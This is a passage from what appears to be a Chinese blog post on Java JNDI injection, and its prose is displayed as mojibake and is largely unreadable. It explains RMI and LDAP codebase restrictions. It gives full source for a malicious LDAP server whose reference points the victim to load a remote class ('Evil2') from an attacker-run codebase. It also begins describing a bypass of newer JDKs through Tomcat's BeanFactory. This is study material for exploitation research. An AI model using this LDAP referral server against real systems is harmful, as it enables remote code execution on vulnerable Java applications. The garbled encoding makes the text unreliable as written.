çš„é™åˆ¶ã€‚åˆ©ç”¨æ¡ä»¶å¦‚ä¸‹ï¼š</p><ol><li>RMIå®¢æˆ·ç«¯çš„ä¸Šä¸‹æ–‡ç¯å¢ƒå…è®¸è®¿é—®è¿œç¨‹Codebaseã€‚</li><li>å±æ€§ java.rmi.server.useCodebaseOnly çš„å€¼å¿…éœ€ä¸ºfalseã€‚</li></ol><p>ç„¶è€Œä»JDK 6u45ã€7u21å¼€å§‹ï¼Œjava.rmi.server.useCodebaseOnly çš„é»˜è®¤å€¼å°±æ˜¯trueã€‚å½“è¯¥å€¼ä¸ºtrueæ—¶ï¼Œå°†ç¦ç”¨è‡ªåŠ¨åŠ è½½è¿œç¨‹ç±»æ–‡ä»¶ï¼Œä»…ä»CLASSPATHå’Œå½“å‰VMçš„java.rmi.server.codebase æŒ‡å®šè·¯å¾„åŠ è½½ç±»æ–‡ä»¶ã€‚ä½¿ç”¨è¿™ä¸ªå±æ€§æ¥é˜²æ­¢å®¢æˆ·ç«¯VMä»å…¶ä»–Codebaseåœ°å€ä¸ŠåŠ¨æ€åŠ è½½ç±»ï¼Œå¢åŠ äº†RMI ClassLoaderçš„å®‰å…¨æ€§ã€‚</p><p>Changelog:</p><ul><li>JDK 6u45 <a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/relnotes.html">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/relnotes.html</a></li><li>JDK 7u21 <a href="http://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html">http://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a></li></ul></blockquote><h4 id="ç»“åˆååºåˆ—åŒ–æ¼æ´"><a href="#ç»“åˆååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ç»“åˆååºåˆ—åŒ–æ¼æ´"></a>ç»“åˆååºåˆ—åŒ–æ¼æ´</h4><p>è¿™ç§æƒ…å½¢å…¶å®å°±æ˜¯æ¼æ´ç±»é‡å†™çš„readObject()æ–¹æ³•ä¸­ç›´æ¥æˆ–é—´æ¥è°ƒç”¨äº†å¯è¢«å¤–éƒ¨æ§åˆ¶çš„lookup()æ–¹æ³•ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡JNDIæ³¨å…¥æ¥è¿›è¡Œååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚</p><p>ä¾‹å¦‚<code>Spring Frameworkçš„ååºåˆ—åŒ–æ¼æ´</code></p><h4 id="LDAP-Referenceåˆ©ç”¨æŠ€å·§"><a href="#LDAP-Referenceåˆ©ç”¨æŠ€å·§" class="headerlink" title="LDAP+Referenceåˆ©ç”¨æŠ€å·§"></a>LDAP+Referenceåˆ©ç”¨æŠ€å·§</h4><p>åŸç†æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿæ˜¯èµ·ä¸€ä¸ªæ¶æ„çš„æœåŠ¡ï¼Œåªæ˜¯ä»RMIæœåŠ¡å˜æˆäº†LDAPæœåŠ¡ï¼Œéƒ½æ˜¯èƒ½å¯¹æ¥JNDIå®¢æˆ·ç«¯å¹¶ä¸”è¿”å›Referenceå¯¹è±¡çš„ã€‚</p><p>LDAP (Lightweight Directory Access Protocol) : è½»é‡ç›®å½•è®¿é—®åè®®</p><blockquote><p>LDAPæ˜¯ä¸€ä¸ªè·¨å¹³å°çš„ã€æ ‡å‡†çš„åè®®</p><p>LDAPæ”¯æŒTCP/IP</p><p>LDAPä¹Ÿæ˜¯æœ‰clientç«¯å’Œserverç«¯ã€‚serverç«¯æ˜¯ç”¨æ¥å­˜æ”¾èµ„æºï¼Œclientç«¯ç”¨æ¥æ“ä½œå¢åˆ æ”¹æŸ¥ç­‰æ“ä½œ</p><p>LDAPæ˜¯ä¸€ä¸ªåˆ°ç›®å½•æœåŠ¡çš„ç›®å½•è®¿é—®åè®®</p><p>ç›®å½•æœåŠ¡ï¼šç®€å•æ¥è®²æ˜¯ä¸ºäº†æµè§ˆå’Œæœç´¢æ•°æ®è€Œè®¾è®¡çš„ç‰¹æ®Šæ•°æ®åº“ï¼ˆå¾ˆåƒé€šè®¯ç°¿ï¼Œç”±ä»¥å­—æ¯é¡ºåºæ’åˆ—çš„åå­—ã€åœ°å€å’Œç”µè¯å·ç ç»„æˆï¼‰</p><p>LDAP ç±»ä¼¼äºç”¨ä¸€ä¸ªæ ‘çŠ¶ç»“æ„å°†æ•°æ®è”ç³»èµ·æ¥(å’ŒæŸ¥è¯¢DNSæœåŠ¡æŒºç±»ä¼¼çš„)ï¼Œå¤§è‡´å¦‚å›¾æ‰€ç¤ºï¼š</p></blockquote><p><img src="https://c014.cn/blog/java/pics/13.jpg" alt="img"></p><h5 id="LDAP-å¸¸è§åè¯"><a href="#LDAP-å¸¸è§åè¯" class="headerlink" title="LDAP å¸¸è§åè¯"></a>LDAP å¸¸è§åè¯</h5><table><thead><tr><th align="center">ç¼©å†™</th><th align="center">å…¨ç§°</th><th align="center">å«ä¹‰</th></tr></thead><tbody><tr><td align="center">dc</td><td align="center">Domain Component</td><td align="center">åŸŸåçš„éƒ¨åˆ†ï¼Œå…¶æ ¼å¼æ˜¯å°†å®Œæ•´çš„åŸŸååˆ†æˆå‡ éƒ¨åˆ†ï¼Œå¦‚dc=domain,dc=com</td></tr><tr><td align="center">uid</td><td align="center">User Id</td><td align="center">ç”¨æˆ·ID, å¦‚â€testâ€</td></tr><tr><td align="center">ou</td><td align="center">Organization Unit</td><td align="center">ç»„ç»‡å•ä½ï¼Œç±»ä¼¼äºLinuxæ–‡ä»¶ç³»ç»Ÿä¸­çš„å­ç›®å½•ï¼Œæ˜¯ä¸€ä¸ªå®¹å™¨å¯¹è±¡ï¼Œå¯ä»¥åŒ…å«å…¶ä»–å„ç§å¯¹è±¡</td></tr><tr><td align="center">cn</td><td align="center">Common Name</td><td align="center">å…¬å…±åç§°</td></tr><tr><td align="center">sn</td><td align="center">Surname</td><td align="center">å§“</td></tr><tr><td align="center">dn</td><td align="center">Distinguished Name</td><td align="center">å”¯ä¸€è¾¨åˆ«åï¼Œç±»ä¼¼äºç»å¯¹è·¯å¾„ï¼Œå¦‚â€uid=test,ou=sec,dc=domain,dc=comâ€,åœ¨ä¸€ä¸ªç›®å½•æ ‘ä¸­dnæ€»æ˜¯å”¯ä¸€çš„</td></tr><tr><td align="center">rdn</td><td align="center">Relative dn</td><td align="center">ç›¸å¯¹è¾¨åˆ«åï¼Œç±»ä¼¼ç›¸å¯¹è·¯å¾„</td></tr><tr><td align="center">c</td><td align="center">Country</td><td align="center">å›½å®¶</td></tr><tr><td align="center">o</td><td align="center">Organization</td><td align="center">ç»„ç»‡å</td></tr></tbody></table><table><thead><tr><th align="center"></th><th align="center"></th></tr></thead><tbody><tr><td align="center">Directory</td><td align="center">ç›®å½•ï¼Œç”¨äºå­˜æ”¾ä¿¡æ¯çš„å•å…ƒ</td></tr><tr><td align="center">Entry</td><td align="center">æ¡ç›®ï¼Œä¸€ä¸ªentryå°±æ˜¯ä¸€æ¡è®°å½•ï¼Œæ˜¯LDAPä¸­ä¸€ä¸ªåŸºæœ¬çš„å­˜å‚¨å•å…ƒ</td></tr><tr><td align="center">DNï¼šDistinguished Name</td><td align="center">æ¡ç›®ä¸­ç”¨äºå”¯ä¸€åŒºåˆ«æ”¹æ¡ç›®çš„ä¿¡æ¯</td></tr><tr><td align="center">LDIFï¼šLDAP Interchange Format</td><td align="center">ç”¨äºè§„èŒƒLDAPçš„é…ç½®å’Œç›®å½•å†…å®¹ç­‰è¯¦ç»†ä¿¡æ¯çš„ä¿å­˜</td></tr><tr><td align="center">Objectclass</td><td align="center">LDAPå¯¹è±¡ç±»ï¼Œæ˜¯LDAPå†…ç½®çš„æ•°æ®æ¨¡å‹ã€‚æ¯ç§objectClassæœ‰è‡ªå·±çš„æ•°æ®ç»“æ„</td></tr></tbody></table><p><code>LDAP</code>çš„å…·ä½“çŸ¥è¯†å¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« <a href="https://www.cnblogs.com/kevingrace/p/5773974.html%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B8%BB%E8%A6%81%E7%9C%8B%E7%9C%8BLDAP%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">https://www.cnblogs.com/kevingrace/p/5773974.htmlï¼Œè¿™é‡Œä¸»è¦çœ‹çœ‹LDAPçš„æ¼æ´åˆ©ç”¨</a></p><p><strong>ç›®å½•æ ‘æ¦‚å¿µ</strong></p><ul><li>ç›®å½•æ ‘ï¼šåœ¨ä¸€ä¸ªç›®å½•æœåŠ¡ç³»ç»Ÿä¸­ï¼Œæ•´ä¸ªç›®å½•ä¿¡æ¯é›†å¯ä»¥è¡¨ç¤ºä¸ºä¸€ä¸ªç›®å½•ä¿¡æ¯æ ‘ï¼Œæ ‘ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹æ˜¯ä¸€ä¸ªæ¡ç›®</li><li>æ¡ç›®ï¼šæ¯ä¸ªæ¡ç›®å°±æ˜¯ä¸€æ¡è®°å½•ï¼Œæ¯ä¸ªæ¡ç›®æœ‰è‡ªå·±çš„å”¯ä¸€å¯åŒºåˆ«çš„åç§°ï¼ˆDNï¼‰</li><li>å¯¹è±¡ç±»ï¼šä¸æŸä¸ªå®ä½“ç±»å‹å¯¹åº”çš„ä¸€ç»„å±æ€§ï¼Œå¯¹è±¡ç±»æ˜¯å¯ä»¥ç»§æ‰¿çš„ï¼Œè¿™æ ·çˆ¶ç±»çš„å¿…é¡»å±æ€§ä¹Ÿä¼šè¢«ç»§æ‰¿ä¸‹æ¥</li><li>å±æ€§ï¼šæè¿°æ¡ç›®çš„æŸä¸ªæ–¹é¢çš„ä¿¡æ¯ï¼Œä¸€ä¸ªå±æ€§ç”±ä¸€ä¸ªå±æ€§ç±»å‹å’Œä¸€ä¸ªæˆ–å¤šä¸ªå±æ€§å€¼ç»„æˆï¼Œå±æ€§æœ‰å¿…é¡»å±æ€§å’Œéå¿…é¡»å±æ€§ã€‚å¦‚<code>javaCodeBase</code>ã€<code>objectClass</code>ã€<code>javaFactory</code>ã€<code>javaSerializedData</code>ã€<code>javaRemoteLocation</code>ç­‰å±æ€§ï¼Œåœ¨åé¢çš„åˆ©ç”¨ä¸­ä¼šç”¨åˆ°è¿™äº›å±æ€§</li></ul><h5 id="LDAPæ”»å‡»"><a href="#LDAPæ”»å‡»" class="headerlink" title="LDAPæ”»å‡»"></a>LDAPæ”»å‡»</h5><p>è¿™é‡Œæ¼”ç¤ºä¸€ä¸ªæ ·ä¾‹</p><p>å®¢æˆ·ç«¯</p><p><img src="https://img-blog.csdnimg.cn/fbcad8b9a8434d43a31fec71fdce31fb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æœåŠ¡ç«¯</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> JDNI.com.RMIattack;<br><br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchEntry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LdapServer</span> </span>&#123;<br>    <span class="hljs-comment">//åŸŸåçš„éƒ¨åˆ†ï¼Œå…¶æ ¼å¼æ˜¯å°†å®Œæ•´çš„åŸŸååˆ†æˆå‡ éƒ¨åˆ†ï¼Œå¦‚åŸŸåä¸ºexample.comå˜æˆdc=example,dc=com</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String LDAP_BASE = <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        String url = <span class="hljs-string">&quot;http://127.0.0.1:8000/#Evil2&quot;</span>;<br>        <span class="hljs-keyword">int</span> port = <span class="hljs-number">2333</span>;<br><br>        <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªæ–°çš„å†…å­˜ç›®å½•æœåŠ¡å™¨é…ç½®å¯¹è±¡</span><br>        InMemoryDirectoryServerConfig config = <span class="hljs-keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);<br>        <span class="hljs-comment">//é…ç½®åœ¨å†…å­˜ç›®å½•æœåŠ¡å™¨ä¸­ä½¿ç”¨çš„ä¾¦å¬å™¨</span><br>        config.setListenerConfigs(<span class="hljs-keyword">new</span> InMemoryListenerConfig(<br>           <span class="hljs-string">&quot;listen&quot;</span>, <span class="hljs-comment">//åˆ†é…ç»™æ­¤ä¾¦å¬å™¨çš„åç§°</span><br>           InetAddress.getByName(<span class="hljs-string">&quot;127.0.0.1&quot;</span>),<span class="hljs-comment">// ä¾¦å¬å™¨åº”æ¥å—æ¥è‡ªå®¢æˆ·ç«¯çš„è¿æ¥çš„åœ°å€ã€‚å®ƒå¯èƒ½ nullè¡¨æ˜å®ƒåº”è¯¥æ¥å—æ‰€æœ‰æ¥å£ä¸Šæ‰€æœ‰åœ°å€ä¸Šçš„è¿æ¥ã€‚</span><br>                port, <span class="hljs-comment">//ä¾¦å¬å™¨åº”æ¥å—æ¥è‡ªå®¢æˆ·ç«¯çš„è¿æ¥çš„ç«¯å£</span><br>                ServerSocketFactory.getDefault(), <span class="hljs-comment">//æ¥å—å®¢æˆ·ç«¯è¿æ¥æ—¶åº”ç”¨äºåˆ›å»ºå¥—æ¥å­—çš„å¥—æ¥å­—å·¥å‚</span><br>                SocketFactory.getDefault(), <span class="hljs-comment">// åº”ç”¨äºåˆ›å»ºä¸æœåŠ¡å™¨çš„å®¢æˆ·ç«¯è¿æ¥çš„å¥—æ¥å­—å·¥å‚</span><br>                (SSLSocketFactory) SSLSocketFactory.getDefault() <span class="hljs-comment">//åº”ç”¨äºå°† StartTLS åŠ å¯†æ·»åŠ åˆ°ç°æœ‰è¿æ¥çš„å¥—æ¥å­—å·¥å‚</span><br>        ));<br><br>        config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> OperationInterceptor(<span class="hljs-keyword">new</span> URL(url)));<br>        InMemoryDirectoryServer ds = <span class="hljs-keyword">new</span> InMemoryDirectoryServer(config);<br>        System.out.println(<span class="hljs-string">&quot;LDAP server is listening on 0.0.0.0:2333&quot;</span>);<br>        ds.startListening();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">InMemoryOperationInterceptor</span></span>&#123;<br>        <span class="hljs-keyword">private</span> URL codebase;<br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">OperationInterceptor</span><span class="hljs-params">(URL cb)</span></span>&#123;<br>            <span class="hljs-keyword">this</span>.codebase = cb;<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">processSearchResult</span> <span class="hljs-params">(InMemoryInterceptedSearchResult result)</span></span>&#123;<br>            String base = result.getRequest().getBaseDN();<br>            Entry e = <span class="hljs-keyword">new</span> Entry(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result,base,e);<br>            &#125;<span class="hljs-keyword">catch</span> (Exception p)&#123;<br>                p.printStackTrace();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@param</span> result  an API that can be used in the course of processing a search request via the InMemoryOperationInterceptor API.</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@param</span> base æ ¹èŠ‚ç‚¹</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@param</span> e éœ€è¦æœç´¢çš„æ¡ç›®ä¿¡æ¯</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sendResult</span><span class="hljs-params">(InMemoryInterceptedSearchResult result, String base,Entry e)</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException </span>&#123;<br>            URL turl = <span class="hljs-keyword">new</span> URL(<span class="hljs-keyword">this</span>.codebase,<span class="hljs-keyword">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>)); <span class="hljs-comment">//æ„é€ æˆ‘ä»¬æ¶æ„ç±»çš„åå­— è¿™é‡Œä¸ºEEvil2.class</span><br>            <br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            <span class="hljs-comment">//è®¾ç½®JavaClassNameå±æ€§å€¼</span><br>            e.addAttribute(<span class="hljs-string">&quot;JavaClassName&quot;</span>,<span class="hljs-string">&quot;Exploit&quot;</span>);<br>            String cbString = <span class="hljs-keyword">this</span>.codebase.toString();<br>            <span class="hljs-keyword">int</span> refPos = cbString.indexOf(<span class="hljs-string">&quot;#&quot;</span>);<br>            <span class="hljs-keyword">if</span> (refPos&gt;<span class="hljs-number">0</span>)&#123;<br>                cbString = cbString.substring(<span class="hljs-number">0</span>,refPos); <span class="hljs-comment">//è·å–ä»£ç åº“url</span><br>            &#125;<br>            <span class="hljs-comment">//è®¾ç½®ä¸€äº›ç›¸å…³å¾—å±æ€§</span><br>            e.addAttribute(<span class="hljs-string">&quot;javaCodeBase&quot;</span>,cbString);<br>            e.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>,<span class="hljs-string">&quot;javaNamingReference&quot;</span>);<br>            e.addAttribute(<span class="hljs-string">&quot;javaFactory&quot;</span>,<span class="hljs-keyword">this</span>.codebase.getRef());  <span class="hljs-comment">//å·¥å‚åEvil2</span><br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> LDAPResult(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br>    &#125;<br><br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/7cd47081e3d04380b549a4e2fdb04318.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä½†æ˜¯ä¸Šé¢æˆ‘ç”¨çš„<code>jdk1.8.0_312</code>å¯¼è‡´éœ€è¦è®¾ç½®<code>System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;, &quot;true&quot;);</code>æœ€å¼€å§‹æ²¡åŠ ä¸Šæµªè´¹äº†äº›æ—¶é—´ï¼Œä¸è¿‡è°ƒè¯•æ‰¾bugçš„è¿‡ç¨‹ä¹Ÿå¾ˆå—ç›Šã€‚å…¶å®è°ƒè¯•è¿‡ä¸Šé¢çš„RMIçš„è¿‡ç¨‹ä¹‹åï¼Œå¯¹äºLDAPçš„è°ƒè¯•ä¼šç†Ÿæ‚‰å¾ˆå¤šã€‚ç»è¿‡è°ƒè¯•LDAPclientå¯ä»¥å‘ç°ï¼Œå…¶å®åªæ˜¯å‰é¢çš„æŸäº›æ–¹æ³•æ‰€åœ¨çš„ç±»ä¸å¤ªä¸€æ ·ï¼Œä½†æœ€ç»ˆè¿˜æ˜¯å¾—å›åˆ°æ–¹æ³•<code>getObjectFactoryFromReference</code>æ‰€ä»¥æˆ‘ä»¬ç›´æ¥åœ¨è¿™ä¸ªåœ°æ–¹æ‰“æ–­ç‚¹ã€‚</p><p>è·Ÿè¿›å­—èŠ‚ç å¾—åŠ è½½</p><p><img src="https://img-blog.csdnimg.cn/fcc09bbdbeb1486c8903e70b3759c186.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¯ä»¥å‘ç°åœ¨<code>loadClass:110, VersionHelper12 (com.sun.naming.internal)</code>ä¸­è¿›è¡Œäº†ä¸€ä¸ªifåˆ¤æ–­å½“ä¸è®¾ç½®æˆfalseå¾—æ—¶å€™ä¸ä¼šè¿›è¡Œä¸‹é¢çš„<code>URLClassLoader.newInstance(getUrlArray(codebase), parent);</code></p><p><img src="https://img-blog.csdnimg.cn/709b6a01fb624636884836a797ee31df.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä½†æ˜¯æ³¨æ„ä¸€ç‚¹å°±æ˜¯ï¼ŒLDAP+Referenceçš„æŠ€å·§è¿œç¨‹åŠ è½½Factoryç±»ä¸å—RMI+Referenceä¸­çš„<code>com.sun.jndi.rmi.object.trustURLCodebase</code>ã€<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>ç­‰å±æ€§çš„é™åˆ¶ï¼Œæ‰€ä»¥é€‚ç”¨èŒƒå›´æ›´å¹¿ã€‚ä½†åœ¨JDK 8u191ã€7u201ã€6u211ä¹‹åï¼Œ<code>com.sun.jndi.ldap.object.trustURLCodebase</code>å±æ€§çš„é»˜è®¤å€¼è¢«è®¾ç½®ä¸ºfalseï¼Œå¯¹LDAP Referenceè¿œç¨‹å·¥å‚ç±»çš„åŠ è½½å¢åŠ äº†é™åˆ¶ã€‚</p><h1 id="Spring-Frameworkååºåˆ—åŒ–æ¼æ´åˆ†æ"><a href="#Spring-Frameworkååºåˆ—åŒ–æ¼æ´åˆ†æ" class="headerlink" title="Spring Frameworkååºåˆ—åŒ–æ¼æ´åˆ†æ"></a>Spring Frameworkååºåˆ—åŒ–æ¼æ´åˆ†æ</h1><h2 id="é«˜ç‰ˆæœ¬JNDIç»•è¿‡"><a href="#é«˜ç‰ˆæœ¬JNDIç»•è¿‡" class="headerlink" title="é«˜ç‰ˆæœ¬JNDIç»•è¿‡"></a>é«˜ç‰ˆæœ¬JNDIç»•è¿‡</h2><p><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></p><p>è¿™é‡Œæˆ‘ç”¨çš„jdk1.8ï¼Œä¸ç”¨äº1.7å®ƒåœ¨dk8u121ä¹‹åé»˜è®¤è®¾ç½®ä¸­ä¸å†æ”¯æŒè®¾ç½®äº†<code>com.sun.jndi.rmi.object.trustURLCodebase</code>ä¸º falseï¼Œé™åˆ¶äº† RMI åˆ©ç”¨æ–¹å¼ä¸­ä»è¿œç¨‹åŠ è½½<code> Class com.sun.jndi.rmi.registry.RegistryContext#decodeObject</code>ï¼ŒåŒæ ·çš„ldapä¹Ÿæ˜¯ä¸è¡Œçš„</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20220120152645718.png" alt="image-20220120152645718"></p><p><img src="https://img-blog.csdnimg.cn/709b6a01fb624636884836a797ee31df.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å…³äºç»•è¿‡ï¼Œå¼•ç”¨ä¸€ä¸‹æ–‡ç« ä¸­çš„è¯</p><blockquote><p>é’ˆå¯¹ RMI åˆ©ç”¨çš„æ£€æŸ¥æ–¹å¼ä¸­æœ€å…³é”®çš„å°±æ˜¯ <code>if (var8 != null &amp;&amp; var8.getFactoryClassLocation() != null &amp;&amp; !trustURLCodebase)</code> å¦‚æœ FactoryClassLocation ä¸ºç©ºï¼Œé‚£ä¹ˆå°±ä¼šè¿›å…¥ <code>NamingManager.getObjectInstance</code> åœ¨æ­¤æ–¹æ³•ä¼šè°ƒç”¨ Reference ä¸­çš„ObjectFactoryã€‚å› æ­¤ç»•è¿‡æ€è·¯ä¸ºåœ¨ç›®æ ‡ classpath ä¸­å¯»æ‰¾å®ç° ObjectFactory æ¥å£çš„ç±»ã€‚åœ¨ Tomcat ä¸­æœ‰ä¸€å¤„å¯ä»¥åˆ©ç”¨çš„ç¬¦åˆæ¡ä»¶çš„ç±»<code>org.apache.naming.factory.BeanFactory</code> åœ¨æ­¤ç±»ä¸­ä¼šè·å– Reference ä¸­çš„<code>forceString</code> å¾—åˆ°å…¶ä¸­çš„å€¼ä¹‹åä¼šåˆ¤æ–­æ˜¯å¦åŒ…å«ç­‰å·ï¼Œå¦‚æœåŒ…å«åˆ™ç”¨ç­‰å·åˆ†å‰²ï¼Œå°†å‰ä¸€åŠå½“åšæ–¹æ³•åï¼Œåä¸€åŠå½“åš Hashmap ä¸­çš„ keyã€‚å¦‚æœä¸åŒ…å«ç­‰å·åˆ™æ–¹æ³•åå˜æˆ setå¼€å¤´ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯æ­¤æ–¹æ³•ä¸­å·²ç»æŒ‡å®šäº†å‚æ•°ç±»å‹ä¸º Stringã€‚åé¢å°†ä¼šåˆ©ç”¨åå°„æ‰§è¡Œå‰é¢æ‰€æåˆ°çš„æ–¹æ³•ã€‚å› æ­¤éœ€è¦æ‰¾åˆ°ä½¿ç”¨äº† String ä½œä¸ºå‚æ•°ï¼Œå¹¶ä¸”èƒ½ 